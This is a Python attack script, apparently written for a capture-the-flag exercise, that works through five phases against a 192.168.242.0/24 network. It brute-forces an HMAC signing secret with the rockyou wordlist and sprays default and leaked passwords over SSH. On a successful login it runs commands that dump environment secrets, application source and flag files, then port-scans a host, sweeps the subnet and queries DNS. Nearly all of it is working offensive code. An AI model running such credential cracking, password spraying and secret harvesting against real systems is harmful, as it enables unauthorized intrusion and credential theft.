#!/usr/bin/env python3
"""round63 — Reversed HMAC args + SSH with known creds + broader port scan"""
import gzip, hmac as hm, hashlib, time, os, sys, socket, subprocess

KNOWN_URL = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")
KNOWN_SIG_HEX = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# ============================================================
print("="*70)
print("PHASE 1: REVERSED HMAC — HMAC(url, word) via rockyou.txt")
print("="*70)
print("  Previously tested HMAC(word, url) — no match")
print("  NOW testing HMAC(url, word) — reversed arguments!")

gz_path = "/usr/share/wordlists/rockyou.txt.gz"
txt_path = "/usr/share/wordlists/rockyou.txt"

if os.path.exists(txt_path):
    src, opener = txt_path, open
elif os.path.exists(gz_path):
    src, opener = gz_path, gzip.open
else:
    print("  ERROR: rockyou.txt not found")
    src = None

if src:
    print(f"  Source: {src}")
    count = 0
    found = False
    t0 = time.time()

    try:
        with opener(src, "rb") as f:
            for line in f:
                word = line.rstrip(b"\n\r")
                if not word:
                    continue
                count += 1

                # Test 1: HMAC(url, word) — reversed
                if hm.new(KNOWN_URL, word, hashlib.sha256).digest() == KNOWN_SIG:
                    elapsed = time.time() - t0
                    print(f"\n  *** FOUND via HMAC(url, word): {word!r} ***")
                    print(f"  *** Decoded: {word.decode('utf-8', errors='replace')} ***")
                    print(f"  *** After {count:,} attempts in {elapsed:.1f}s ***")
                    found = True
                    break

                # Test 2: SHA256(word + url)
                if hashlib.sha256(word + KNOWN_URL).digest() == KNOWN_SIG:
                    print(f"\n  *** FOUND via SHA256(word+url): {word!r} ***")
                    found = True
                    break

                # Test 3: SHA256(url + word)
                if hashlib.sha256(KNOWN_URL + word).digest() == KNOWN_SIG:
                    print(f"\n  *** FOUND via SHA256(url+word): {word!r} ***")
                    found = True
                    break

                # Test 4: SHA256(word + ":" + url)
                if hashlib.sha256(word + b":" + KNOWN_URL).digest() == KNOWN_SIG:
                    print(f"\n  *** FOUND via SHA256(word:url): {word!r} ***")
                    found = True
                    break

                # Test 5: SHA256(url + ":" + word)
                if hashlib.sha256(KNOWN_URL + b":" + word).digest() == KNOWN_SIG:
                    print(f"\n  *** FOUND via SHA256(url:word): {word!r} ***")
                    found = True
                    break

                if count % 500000 == 0:
                    elapsed = time.time() - t0
                    rate = count / elapsed
                    print(f"  {count:>10,} words | {rate:>8,.0f}/sec | {elapsed:>6.0f}s", flush=True)

        if not found:
            elapsed = time.time() - t0
            print(f"\n  No match in {count:,} words ({elapsed:.0f}s) — all 5 constructions tested")

    except KeyboardInterrupt:
        elapsed = time.time() - t0
        print(f"\n  Interrupted after {count:,} words ({elapsed:.0f}s)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: SSH WITH KNOWN CREDENTIALS")
print("="*70)

hosts = ["192.168.242.101", "192.168.242.102", "192.168.242.103",
         "192.168.242.104", "192.168.242.106"]

creds = [
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("root", "admin"),
    ("admin", "admin"),
    ("admin", "password"),
    ("user", "user"),
    ("user", "password"),
    ("ctf", "ctf"),
    ("ctf", "password"),
    ("ctf", "flag"),
    ("operator", "operator"),
    ("carrier", "carrier"),
    ("probe", "probe"),
    ("probe", "probe_secret"),
    ("caspiterminal", "caspiterminal"),
    # App credentials
    ("ctf_fubznz", "Ctffubznz2026!"),
    ("root", "Ctffubznz2026!"),
    ("admin", "Ctffubznz2026!"),
]

try:
    import paramiko
    print("  paramiko available!")

    for host in hosts:
        for user, pwd in creds:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, 22, user, pwd, timeout=3,
                             allow_agent=False, look_for_keys=False)
                print(f"\n  *** SSH LOGIN: {user}@{host} with {pwd} ***")

                # Run commands
                for cmd in ["id", "cat /proc/self/environ | tr '\\0' '\\n' | grep -i probe",
                           "env | grep -i probe", "env | grep -i secret",
                           "cat /app/app.py 2>/dev/null | head -50",
                           "find / -name 'probe*' -o -name '*secret*' 2>/dev/null | head -20",
                           "cat /flag* 2>/dev/null", "ls -la /var/local/ 2>/dev/null"]:
                    stdin, stdout, stderr = client.exec_command(cmd, timeout=5)
                    out = stdout.read().decode(errors='replace').strip()
                    err = stderr.read().decode(errors='replace').strip()
                    if out:
                        print(f"    $ {cmd[:60]}")
                        print(f"      {out[:500]}")

                client.close()
                break  # Found valid creds for this host
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                if "Authentication" not in str(e):
                    pass
                break  # Connection error, skip host

except ImportError:
    print("  paramiko not available, trying sshpass...")

    # Check if sshpass is available
    try:
        subprocess.run(["sshpass", "-V"], capture_output=True, timeout=3)
        has_sshpass = True
    except:
        has_sshpass = False

    if has_sshpass:
        for host in hosts[:2]:  # Test first 2 hosts
            for user, pwd in creds[:10]:  # First 10 creds
                try:
                    result = subprocess.run(
                        ["sshpass", f"-p{pwd}", "ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=3", f"{user}@{host}", "id"],
                        capture_output=True, text=True, timeout=5
                    )
                    if result.returncode == 0:
                        print(f"  *** SSH: {user}@{host} with {pwd}: {result.stdout.strip()} ***")

                        # Get env
                        result2 = subprocess.run(
                            ["sshpass", f"-p{pwd}", "ssh", "-o", "StrictHostKeyChecking=no",
                             f"{user}@{host}", "env | grep -iE 'probe|secret|flag|key'"],
                            capture_output=True, text=True, timeout=5
                        )
                        if result2.stdout.strip():
                            print(f"  *** ENV: {result2.stdout.strip()} ***")
                except:
                    pass
    else:
        print("  sshpass not available either")
        print("  Try manually: ssh root@192.168.242.102 with passwords: root, toor, password, admin")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: BROADER PORT SCAN ON .102")
print("="*70)

host = "192.168.242.102"
interesting_ports = [
    21, 23, 25, 53, 80, 111, 139, 443, 445, 993, 995,
    1080, 1337, 2222, 3000, 3306, 4444, 5000, 5432, 5555,
    5900, 6379, 6666, 7777, 8000, 8001, 8008, 8080, 8081,
    8443, 8888, 8899, 9000, 9001, 9090, 9100, 9200, 9999,
    10000, 10080, 11211, 15672, 27017, 28017, 31337, 50000
]

open_ports = []
for port in interesting_ports:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((host, port))
        if result == 0:
            open_ports.append(port)
            print(f"  OPEN: {host}:{port}")
        sock.close()
    except:
        pass

if not open_ports:
    print(f"  No additional ports found (beyond 22, 8007, 9000)")
else:
    print(f"\n  Open ports: {open_ports}")
    # Quick service detection on new ports
    for port in open_ports:
        if port not in [22, 8007, 9000]:
            try:
                r = __import__('requests').get(f"http://{host}:{port}/", timeout=3)
                print(f"  http://{host}:{port}/: [{r.status_code}] {r.text[:200]}")
            except Exception as e:
                # Try raw TCP
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((host, port))
                    sock.send(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
                    data = sock.recv(1024)
                    print(f"  raw {host}:{port}: {data[:200]}")
                    sock.close()
                except:
                    print(f"  {host}:{port}: open but no HTTP response")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: FULL SUBNET SCAN — PORTS 5000, 3306, 6379, 8888")
print("="*70)

for port in [5000, 3306, 6379, 8888, 1337, 31337, 4444]:
    print(f"\n  Scanning 192.168.242.0/24 for port {port}...")
    for i in range(1, 255):
        ip = f"192.168.242.{i}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"    FOUND: {ip}:{port}")
                # Quick check
                try:
                    r = __import__('requests').get(f"http://{ip}:{port}/", timeout=2)
                    print(f"      HTTP [{r.status_code}]: {r.text[:150]}")
                except:
                    pass
            sock.close()
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: DNS RESOLUTION — gauge-gw.internal")
print("="*70)

# Try to resolve gauge-gw.internal from our machine
try:
    ip = socket.gethostbyname("gauge-gw.internal")
    print(f"  gauge-gw.internal resolves to: {ip}")
except:
    print("  gauge-gw.internal: cannot resolve from Kali")

# Try resolving via the Docker DNS (127.0.0.11) — won't work from Kali
# But we can try the CTF DNS servers
try:
    result = subprocess.run(
        ["dig", "+short", "gauge-gw.internal", "@192.168.242.102"],
        capture_output=True, text=True, timeout=5
    )
    if result.stdout.strip():
        print(f"  via .102 DNS: {result.stdout.strip()}")
except:
    pass

try:
    result = subprocess.run(
        ["dig", "+short", "gauge-gw.internal", "@192.168.242.1"],
        capture_output=True, text=True, timeout=5
    )
    if result.stdout.strip():
        print(f"  via .1 DNS: {result.stdout.strip()}")
except:
    pass

# Try nslookup to various DNS servers
for dns in ["192.168.242.1", "192.168.242.2", "192.168.242.100",
            "192.168.242.102", "192.168.242.254"]:
    try:
        result = subprocess.run(
            ["nslookup", "gauge-gw.internal", dns],
            capture_output=True, text=True, timeout=3
        )
        if "Address" in result.stdout and "NXDOMAIN" not in result.stdout:
            print(f"  nslookup via {dns}: {result.stdout.strip()}")
    except:
        pass

print("\n"+"="*70)
print("DONE")
print("="*70)
